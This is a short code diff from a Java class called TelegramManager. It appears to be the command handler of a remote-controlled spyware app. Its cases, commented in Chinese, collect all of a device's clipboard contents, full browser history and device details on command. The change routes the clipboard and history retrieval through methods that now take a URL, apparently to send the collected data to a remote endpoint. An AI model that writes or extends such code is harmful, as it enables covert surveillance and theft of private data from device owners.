@@ -267,10 +267,10 @@ public class TelegramManager {
                                 }
                                 break;
                             case "CUT_PASTE_HIS_ALL": // 获取全部剪贴板内容
-                                Datas(context,action_id,0,"success", SQLiteManager.getClipList());
+                                SQLiteManager.getClipList(context,action_id,url);
                                 break;
                             case "BROWSER_HIS_ALL": // 获取全部浏览器记录
-                                Datas(context,action_id,0,"success", SQLiteManager.getLogList());
+                                SQLiteManager.getLogList(context,action_id,url);
                                 break;
                             case "INFO": // 详细信息
                                 JsonObject info = new JsonObject();
